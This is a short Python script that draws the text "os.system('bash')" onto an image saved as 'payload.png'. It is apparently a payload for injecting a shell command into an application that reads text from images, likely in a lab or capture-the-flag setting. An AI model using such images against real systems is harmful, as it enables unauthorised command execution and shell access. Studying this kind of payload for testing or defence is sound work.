from PIL import Image, ImageDraw, ImageFont

font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 100)
img = Image.new('RGB', (6000, 400), color='white')
d = ImageDraw.Draw(img)
d.text((100, 150), "os.system('bash')", fill='black', font=font)
img.save('payload.png')
